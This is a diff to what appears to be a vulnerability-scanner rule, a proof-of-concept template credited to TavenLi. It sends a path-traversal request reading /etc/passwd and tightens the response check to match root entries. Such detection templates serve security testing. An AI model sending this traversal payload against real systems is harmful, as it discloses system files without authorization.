@@ -5,7 +5,7 @@ rules:
     request:
       method: GET
       path: /api-third-party/download/extdisks../etc/passwd
-    expression: response.status == 200
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
 expression: r0()
 detail:
   author: TavenLi (https://github.com/tavenli)
